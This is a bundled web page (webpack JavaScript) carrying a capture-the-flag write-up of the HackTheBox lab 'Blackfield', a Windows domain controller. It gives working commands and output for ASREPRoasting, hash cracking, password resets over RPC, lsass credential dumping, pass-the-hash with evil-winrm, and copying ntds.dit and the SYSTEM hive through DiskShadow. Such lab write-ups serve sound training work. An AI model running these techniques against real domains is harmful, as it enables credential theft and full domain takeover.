"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[3616],{3905:(e,n,t)=>{t.d(n,{Zo:()=>p,kt:()=>f});var a=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function o(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);n&&(a=a.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,a)}return t}function s(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?o(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function i(e,n){if(null==e)return{};var t,a,r=function(e,n){if(null==e)return{};var t,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)t=o[a],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var l=a.createContext({}),c=function(e){var n=a.useContext(l),t=n;return e&&(t="function"==typeof e?e(n):s(s({},n),e)),t},p=function(e){var n=c(e.components);return a.createElement(l.Provider,{value:n},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var n=e.children;return a.createElement(a.Fragment,{},n)}},m=a.forwardRef((function(e,n){var t=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=c(t),m=r,f=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return t?a.createElement(f,s(s({ref:n},p),{},{components:t})):a.createElement(f,s({ref:n},p))}));function f(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var o=t.length,s=new Array(o);s[0]=m;var i={};for(var l in n)hasOwnProperty.call(n,l)&&(i[l]=n[l]);i.originalType=e,i[d]="string"==typeof e?e:r,s[1]=i;for(var c=2;c<o;c++)s[c]=t[c];return a.createElement.apply(null,s)}return a.createElement.apply(null,t)}m.displayName="MDXCreateElement"},77687:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>s,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var a=t(87462),r=(t(67294),t(3905));const o={layout:"post",title:"Blackfield ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","pe","exploit","htb","smb","rpc","winrm"],date:"2020/10/03 16:30:00",thumbnail:"/img/HackTheBox/blackfield.png",toc:!0},s="Information",i={unversionedId:"HackTheBox/Blackfield/write-up",id:"HackTheBox/Blackfield/write-up",title:"Blackfield ",description:"- Name: Blackfield",source:"@site/writeups/HackTheBox/Blackfield/write-up.md",sourceDirName:"HackTheBox/Blackfield",slug:"/HackTheBox/Blackfield/write-up",permalink:"/writeups/HackTheBox/Blackfield/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"windows",permalink:"/writeups/tags/windows"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"smb",permalink:"/writeups/tags/smb"},{label:"rpc",permalink:"/writeups/tags/rpc"},{label:"winrm",permalink:"/writeups/tags/winrm"}],version:"current",frontMatter:{layout:"post",title:"Blackfield ",lang:"en",categories:["writeups"],tags:["security","writeups","windows","recon","network","pe","exploit","htb","smb","rpc","winrm"],date:"2020/10/03 16:30:00",thumbnail:"/img/HackTheBox/blackfield.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Admirer ",permalink:"/writeups/HackTheBox/Admirer/write-up"},next:{title:"Blunder ",permalink:"/writeups/HackTheBox/Blunder/write-up"}},l={},c=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"SMB enumeration",id:"smb-enumeration",level:2},{value:"RPC enumeration",id:"rpc-enumeration",level:2},{value:"Privilege Escalation of Machine : from support to audit2020",id:"privilege-escalation-of-machine--from-support-to-audit2020",level:2},{value:"Privilege Escalation of Machine : from audit2020 to svc_backup",id:"privilege-escalation-of-machine--from-audit2020-to-svc_backup",level:2},{value:"Privilege Escalation of Machine : from svc_backup to root",id:"privilege-escalation-of-machine--from-svc_backup-to-root",level:2}],p={toc:c},d="wrapper";function u(e){let{components:n,...o}=e;return(0,r.kt)(d,(0,a.Z)({},p,o,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"information"},"Information"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Name:")," Blackfield"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Profile:")," ",(0,r.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/255"},"www.hackthebox.eu")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Difficulty:")," Hard"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"OS:")," Windows"),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("strong",{parentName:"li"},"Points:")," 40")),(0,r.kt)("p",null,(0,r.kt)("img",{alt:"Blackfield",src:t(71062).Z,width:"598",height:"381"})),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,(0,r.kt)("strong",{parentName:"p"},"TL;DR"),": "),(0,r.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pacman -S nmap smbclient impacket python-pypykatz evil-winrm\n")),(0,r.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,r.kt)("p",null,"Port & service discovery with ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'# Nmap 7.80 scan initiated Thu Sep 17 22:39:53 2020 as: nmap -sSVC -p- -oA nmap_full -v 10.10.10.192\nNmap scan report for 10.10.10.192\nHost is up (0.026s latency).\nNot shown: 65527 filtered ports\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain?\n| fingerprint-strings:\n|   DNSVersionBindReqTCP:\n|     version\n|_    bind\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-18 03:48:25Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port53-TCP:V=7.80%I=7%D=9/17%Time=5F63CA20%P=x86_64-unknown-linux-gnu%r\nSF:(DNSVersionBindReqTCP,20,"\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07ver\nSF:sion\\x04bind\\0\\0\\x10\\0\\x03");\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 7h06m19s\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2020-09-18T03:50:43\n|_  start_date: N/A\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Thu Sep 17 22:45:02 2020 -- 1 IP address (1 host up) scanned in 308.41 seconds\n')),(0,r.kt)("p",null,"It seems we have here a domain controller with hostname DC01."),(0,r.kt)("p",null,"Edit ",(0,r.kt)("inlineCode",{parentName:"p"},"/etc/hosts")," to add the local domain:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"10.10.10.192 backfield.local\n")),(0,r.kt)("h2",{id:"smb-enumeration"},"SMB enumeration"),(0,r.kt)("p",null,"Let's find some some shares:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ smbclient -L //10.10.10.192\nEnter WORKGROUP\\cyfun's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        forensic        Disk      Forensic / Audit share.\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        profiles$       Disk\n        SYSVOL          Disk      Logon server share\nSMB1 disabled -- no workgroup available\n")),(0,r.kt)("p",null,"There are two non-default shares:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"forensic"),(0,r.kt)("li",{parentName:"ul"},"profiles$")),(0,r.kt)("p",null,"One is not accessible but the other is:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ smbclient //10.10.10.192/forensic\nEnter WORKGROUP\\cyfun\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> dir\nNT_STATUS_ACCESS_DENIED listing \\*\nsmb: \\> ^C\n\n$ smbclient //10.10.10.192/profiles$\nEnter WORKGROUP\\cyfun\'s password:\nTry "help" to get a list of possible commands.\nsmb: \\> dir\n  .                                   D        0  Wed Jun  3 18:47:12 2020\n  ..                                  D        0  Wed Jun  3 18:47:12 2020\n  AAlleni                             D        0  Wed Jun  3 18:47:11 2020\n  ABarteski                           D        0  Wed Jun  3 18:47:11 2020\n  ABekesz                             D        0  Wed Jun  3 18:47:11 2020\n  ABenzies                            D        0  Wed Jun  3 18:47:11 2020\n  ABiemiller                          D        0  Wed Jun  3 18:47:11 2020\n  AChampken                           D        0  Wed Jun  3 18:47:11 2020\n  ACheretei                           D        0  Wed Jun  3 18:47:11 2020\n...\n')),(0,r.kt)("p",null,"Those folders look like people's profile, but there are three folders not\nstarting with an uppercase letter that doesn't look like a name."),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"audit2020"),(0,r.kt)("li",{parentName:"ul"},"support"),(0,r.kt)("li",{parentName:"ul"},"svc_backup")),(0,r.kt)("p",null,"We can save all profiles to a file:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-sh"},"$ printf %s 'dir' | smbclient //10.10.10.192/profiles$ '' | sed '1,3d;$d' | cut -d ' ' -f 3 -s > profiles.txt\n")),(0,r.kt)("p",null,"As we know from ",(0,r.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," that the is Kerberos running, let's try ASREPRoast."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"The ASREPRoast attack looks for users without Kerberos pre-authentication\nrequired attribute (DONT_REQ_PREAUTH).")),(0,r.kt)("p",null,"Ref. ",(0,r.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast#asreproast"},"HackTricks - ASREPRoast")),(0,r.kt)("p",null,"Then Impacket script ",(0,r.kt)("inlineCode",{parentName:"p"},"GetNPUsers")," allow to check if Kerberos pre-auth\nis enabled for those accounts and extract their password hash:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ GetNPUsers.py blackfield.local/ -usersfile profiles.txt -outputfile hash.txt -dc-ip 10.10.10.192 -format john\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n...\n[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set\n...\n[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set\n...\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n")),(0,r.kt)("p",null,"Only ",(0,r.kt)("em",{parentName:"p"},"support")," had is hash extracted."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cat hash.txt\n$krb5asrep$support@BLACKFIELD.LOCAL:149b486205f9a8d069335550278e2933$0bfbb61c0a3af8cce3d8cd7f6584f411d9a5ac4053cdd802feadb914de2f9e5efe5f636a4ab76cca735f40754868ec140c6ed0d76ce0fc11891e17f518c5611ad1fb2e0d718f5d48a8c84fb0065e430755c9e6ee533ae52a7294b4b1132d20efc948369602dad416f819d48b0f9845268567c91ee02945d237f188162ebf0f43c7bc279ba887abf229f70319b8204ce4266d1bc98f0ce93bf28f72c1b517ab04f24db30e447085dbc156b8e5a2d8c06885e79c851b928d11975cef973a27f36169183ec240fcaca260996113052274be45c7332b202663a43516a08295f7bc25dabf07f3d86153167190e511be5d16a6cdd1ae94\n")),(0,r.kt)("p",null,"Now we can crack it with ",(0,r.kt)("a",{parentName:"p",href:"https://www.openwall.com/john/"},"John the Ripper"),":"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=krb5asrep-aes-opencl\n$ john hash.txt --show\n$krb5asrep$support@BLACKFIELD.LOCAL:#00^BlackKnight\n\n1 password hash cracked, 0 left\n")),(0,r.kt)("h2",{id:"rpc-enumeration"},"RPC enumeration"),(0,r.kt)("p",null,"We can know make use of the freshly discovered credentials to launch an\nauthenticated RPC scan to find domain users."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ rpcclient -U support -W backfield.local 10.10.10.192\nEnter BACKFIELD.LOCAL\\support's password:\nrpcclient $> enumdomusers\nuser:[Administrator] rid:[0x1f4]\nuser:[Guest] rid:[0x1f5]\nuser:[krbtgt] rid:[0x1f6]\nuser:[audit2020] rid:[0x44f]\nuser:[support] rid:[0x450]\nuser:[BLACKFIELD764430] rid:[0x451]\nuser:[BLACKFIELD538365] rid:[0x452]\n...\nuser:[BLACKFIELD438814] rid:[0x584]\nuser:[svc_backup] rid:[0x585]\nuser:[lydericlefebvre] rid:[0x586]\n")),(0,r.kt)("p",null,"We can see ",(0,r.kt)("inlineCode",{parentName:"p"},"lydericlefebvre"),", a new account we didn't see earlier."),(0,r.kt)("p",null,"Now let's list the domain groups:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ rpcclient $> enumdomgroups\ngroup:[Enterprise Read-only Domain Controllers] rid:[0x1f2]\ngroup:[Domain Admins] rid:[0x200]\ngroup:[Domain Users] rid:[0x201]\ngroup:[Domain Guests] rid:[0x202]\ngroup:[Domain Computers] rid:[0x203]\ngroup:[Domain Controllers] rid:[0x204]\ngroup:[Schema Admins] rid:[0x206]\ngroup:[Enterprise Admins] rid:[0x207]\ngroup:[Group Policy Creator Owners] rid:[0x208]\ngroup:[Read-only Domain Controllers] rid:[0x209]\ngroup:[Cloneable Domain Controllers] rid:[0x20a]\ngroup:[Protected Users] rid:[0x20d]\ngroup:[Key Admins] rid:[0x20e]\ngroup:[Enterprise Key Admins] rid:[0x20f]\ngroup:[DnsUpdateProxy] rid:[0x44e]\n")),(0,r.kt)("p",null,"Those are only default groups. Let's check info about the special accounts we\nhave."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ rpcclient $> queryuser 0x586\n        User Name   :   lydericlefebvre\n        Full Name   :   Lyd\xe9ric aas. Lefebvre\n        Home Drive  :\n        Dir Drive   :\n        Profile Path:\n        Logon Script:\n        Description :   @lydericlefebvre - VM Creator\n        Workstations:\n        Comment     :\n        Remote Dial :\n        Logon Time               :      Thu, 01 Jan 1970 01:00:00 CET\n        Logoff Time              :      Thu, 01 Jan 1970 01:00:00 CET\n        Kickoff Time             :      Thu, 14 Sep 30828 04:48:05 CEST\n        Password last set Time   :      Fri, 28 Feb 2020 23:33:36 CET\n        Password can change Time :      Sat, 29 Feb 2020 23:33:36 CET\n        Password must change Time:      Thu, 14 Sep 30828 04:48:05 CEST\n        unknown_2[0..31]...\n        user_rid :      0x586\n        group_rid:      0x201\n        acb_info :      0x00000210\n        fields_present: 0x00ffffff\n        logon_divs:     168\n        bad_password_count:     0x00000000\n        logon_count:    0x00000000\n        padding1[0..7]...\n        logon_hrs[0..21]...\n")),(0,r.kt)("p",null,"I don't know if this will be useful later but we now known that ",(0,r.kt)("inlineCode",{parentName:"p"},"lydericlefebvre"),"\ncould be able to create VM. There was nothing special about the other accounts."),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-support-to-audit2020"},"Privilege Escalation of Machine : from support to audit2020"),(0,r.kt)("p",null,"In case our account is privileged we can try to change other account password.\n",(0,r.kt)("inlineCode",{parentName:"p"},"chgpasswd")," won't help us as it requires the old password. But ",(0,r.kt)("inlineCode",{parentName:"p"},"setuserinfo"),"\ndoesn't."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"rpcclient $> setuserinfo\nUsage: setuserinfo username level password [password_expired]\nresult was NT_STATUS_INVALID_PARAMETER\n")),(0,r.kt)("p",null,"The ",(0,r.kt)("strong",{parentName:"p"},"level")," is defined from ",(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/6b0dff90-5ac0-429a-93aa-150334adabf6?redirectedfrom=MSDN"},"USER_INFORMATION_CLASS"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"rpcclient $> setuserinfo audit2020 23 cyfun123!\n\nrpcclient $> setuserinfo svc_backup 23 cyfun123!\nresult: NT_STATUS_ACCESS_DENIED\nresult was NT_STATUS_ACCESS_DENIED\n\nrpcclient $> setuserinfo lydericlefebvre 23 cyfun123!\nresult: NT_STATUS_ACCESS_DENIED\nresult was NT_STATUS_ACCESS_DENIED\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-audit2020-to-svc_backup"},"Privilege Escalation of Machine : from audit2020 to svc_backup"),(0,r.kt)("p",null,"With support or unauthenticated we were not able to list the content of the\n",(0,r.kt)("em",{parentName:"p"},"forensic")," share but we can with audit2020. So let's dump all we can:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'$ mkdir -p Shares/forensic\n$ cd Shares/forensic\n$ smbclient //10.10.10.192/forensic -U audit2020 -W blackfield.local cyfun123!\nTry "help" to get a list of possible commands.\nsmb: \\> ls\n  .                                   D        0  Sun Feb 23 14:03:16 2020\n  ..                                  D        0  Sun Feb 23 14:03:16 2020\n  commands_output                     D        0  Sun Feb 23 19:14:37 2020\n  memory_analysis                     D        0  Thu May 28 22:28:33 2020\n  tools                               D        0  Sun Feb 23 14:39:08 2020\n\n                7846143 blocks of size 4096. 4156574 blocks available\nsmb: \\> recurse on\nsmb: \\> prompt off\nsmb: \\> mget *\n')),(0,r.kt)("p",null,"PS: a more clever approach would be to avoid dumping ",(0,r.kt)("inlineCode",{parentName:"p"},"tools/")," which will take a\nlot of time and space for generic binaries we do not need."),(0,r.kt)("p",null,"In ",(0,r.kt)("inlineCode",{parentName:"p"},"memory_analissy")," there is a ",(0,r.kt)("inlineCode",{parentName:"p"},"lsass")," dump."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ cd memory_analysis\n$ unzip lsass.zip\nArchive:  lsass.zip\n  inflating: lsass.DMP\n")),(0,r.kt)("p",null,"Then we can use ",(0,r.kt)("strong",{parentName:"p"},"pypykatz"),", Python implementation of Mimikatz, to try to dump\nhashes from here."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ pypykatz lsa minidump lsass.DMP > lsass_dump.txt\nINFO:root:Parsing file lsass.DMP\n")),(0,r.kt)("p",null,"So we obtained those two SHA1 hashes:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"svc_backup:463c13a9a31fc3252c68ba0a44f0221626a33e5c\nAdministrator:db5c89a961644f0978b4b69a4d2a2239d7886368\n")),(0,r.kt)("p",null,"And NT hashes:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"svc_backup:9658d1d1dcd9250115e2205d9f48400d\nAdministrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62\n")),(0,r.kt)("p",null,"We can use ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Hackplayers/evil-winrm"},"evil-winrm")," to make a pass the hash (PtH) authentication\nand gain PowerShell acess:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"$ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192\n\nEvil-WinRM shell v2.3\n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> gc ../Desktop/user.txt\n0d1d70d4c5439a332577fcbc2bcbed15\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents>\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-svc_backup-to-root"},"Privilege Escalation of Machine : from svc_backup to root"),(0,r.kt)("p",null,"Let's check what we can do with this account:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> net user svc_backup\nUser name                    svc_backup\nFull Name\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            2/23/2020 10:54:48 AM\nPassword expires             Never\nPassword changeable          2/24/2020 10:54:48 AM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   9/20/2020 9:38:19 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Backup Operators     *Remote Management Use\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n\n*Evil-WinRM* PS C:\\Users\\svc_backup\\Documents> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeBackupPrivilege             Back up files and directories  Enabled\nSeRestorePrivilege            Restore files and directories  Enabled\nSeShutdownPrivilege           Shut down the system           Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n")),(0,r.kt)("p",null,"Our account have way to much power!"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},(0,r.kt)("em",{parentName:"p"},"SeBackup")," & ",(0,r.kt)("em",{parentName:"p"},"SeRestore")," privileges (from the ",(0,r.kt)("em",{parentName:"p"},"Backup Operators")," group) allow us to\nset permissionand ownership on each file & folder.")),(0,r.kt)("p",null,"References:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/"},"DiskShadow: The Return of VSS Evasion, Persistence, and Active Directory Database Extraction, by bohops, March 26th 2018")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf"},"show me your privileges and I will lead you to SYSTEM, by Andrea Pierini at Hack in Paris, June 19th 2019"))),(0,r.kt)("p",null,"Normally we shouldn't be able to access ntds.dit (Active Directory database)\nbut since ",(0,r.kt)("em",{parentName:"p"},"SeBackup")," & ",(0,r.kt)("em",{parentName:"p"},"SeRestore")," privileges let us set any permission on\nany file we will be able to fix that."),(0,r.kt)("p",null,"Let's auto-gives us full control on ",(0,r.kt)("inlineCode",{parentName:"p"},"ntds.dit"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},'$ntds_file = "C:\\Windows\\NTDS\\ntds.dit"\n$acl_ntds = Get-Acl $ntds_file\n$domain = "blackfield.local"\n$account = "svc_backup"\n$access_rule = New-Object System.Security.AccessControl.FileSystemAccessRule("$domain\\$account","FullControl","Allow")\n$acl_ntds.SetAccessRule($access_rule)\n$acl_ntds | Set-Acl $ntds_file\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-powershell"},"Get-acl $ntds_file | select -expand accesstostring\nBLACKFIELD\\svc_backup Allow  FullControl\nNT AUTHORITY\\SYSTEM Allow  FullControl\nBUILTIN\\Administrators Allow  FullContro\n")),(0,r.kt)("p",null,"Now we'll use ",(0,r.kt)("inlineCode",{parentName:"p"},"DiskShadow")," to make a shadow copy of the ntds."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. DiskShadow also includes a scriptable mode."),(0,r.kt)("p",{parentName:"blockquote"},(0,r.kt)("a",{parentName:"p",href:"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow"},"Microsoft Docs"))),(0,r.kt)("p",null,"Let's prepapre the copy script (",(0,r.kt)("inlineCode",{parentName:"p"},"diskshadow.txt"),") to run ",(0,r.kt)("inlineCode",{parentName:"p"},"DiskShadow")," in script\nmode."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-batch"},'set context persistent nowriters#\nadd volume c: alias cyfun#\ncreate#\nexpose %cyfun% x:#\nexec "cmd.exe" /c copy x:\\windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\Videos\\ntds.dit#\ndelete shadows volume %cyfun%#\nreset#\n')),(0,r.kt)("p",null,"Then we can use ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Hackplayers/evil-winrm"},"evil-winrm")," native upload feature."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos> upload /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt\nInfo: Uploading /home/cyfun/CTF/HackTheBox/machines/Blackfield/diskshadow.txt to C:\\Users\\svc_backup\\Videos\\diskshadow.txt\n\n\nData: 268 bytes of 268 bytes copied\n\nInfo: Upload successful!\n")),(0,r.kt)("p",null,"And then call ",(0,r.kt)("inlineCode",{parentName:"p"},"DiskShadow"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'*Evil-WinRM* PS C:\\Users\\svc_backup> diskshadow.exe /s C:\\Users\\svc_backup\\Videos\\diskshadow.txt\nMicrosoft DiskShadow version 1.0\nCopyright (C) 2013 Microsoft Corporation\nOn computer:  DC01,  9/21/2020 12:12:50 AM\n\n-> set context persistent nowriters\n-> add volume c: alias cyfun\n-> create\nAlias cyfun for shadow ID {eef6f0be-3c60-4e69-985d-3bc400a24ff1} set as environment variable.\nAlias VSS_SHADOW_SET for shadow set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef} set as environment variable.\n\nQuerying all shadow copies with the shadow copy set ID {12b5d80f-4368-4727-a02b-1b22f5e020ef}\n\n        * Shadow copy ID = {eef6f0be-3c60-4e69-985d-3bc400a24ff1}               %cyfun%\n                - Shadow copy set: {12b5d80f-4368-4727-a02b-1b22f5e020ef}       %VSS_SHADOW_SET%\n                - Original count of shadow copies = 1\n                - Original volume name: \\\\?\\Volume{351b4712-0000-0000-0000-602200000000}\\ [C:\\]\n                - Creation time: 9/21/2020 12:12:51 AM\n                - Shadow copy device name: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\n                - Originating machine: DC01.BLACKFIELD.local\n                - Service machine: DC01.BLACKFIELD.local\n                - Not exposed\n                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}\n                - Attributes:  No_Auto_Release Persistent No_Writers Differential\n\nNumber of shadow copies listed: 1\n-> expose %cyfun% z:\n-> %cyfun% = {eef6f0be-3c60-4e69-985d-3bc400a24ff1}\nThe shadow copy was successfully exposed as z:\\.\n-> exec "cmd.exe" /c copy z:\\windows\\ntds\\ntds.dit c:\\Users\\svc_backup\\Videos\\ntds.dit\n\nThe script file name is not valid.\n\nEXEC <file.cmd>\n        Execute a script file on the local machine.\n        This command is used to duplicate or restore data as part of\n        a backup or restore sequence.\n')),(0,r.kt)("p",null,"As I got issues with the ",(0,r.kt)("inlineCode",{parentName:"p"},"exec")," command I manually copied the file afterward:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos> cp x:\\windows\\ntds\\ntds.dit .\n")),(0,r.kt)("p",null,"Then we can also dump the SYSTEM hive:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos> reg save hklm\\system system.hive\n")),(0,r.kt)("p",null,"Again, we can use ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/Hackplayers/evil-winrm"},"evil-winrm")," native download feature."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"*Evil-WinRM* PS C:\\Users\\svc_backup\\Videos> download ntds.dit /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit\nInfo: Downloading C:\\Users\\svc_backup\\Videos\\ntds.dit to /home/cyfun/CTF/HackTheBox/machines/Blackfield/ntds.dit\n\n\nInfo: Download successful!\n\n\n")),(0,r.kt)("p",null,"Finally we can use 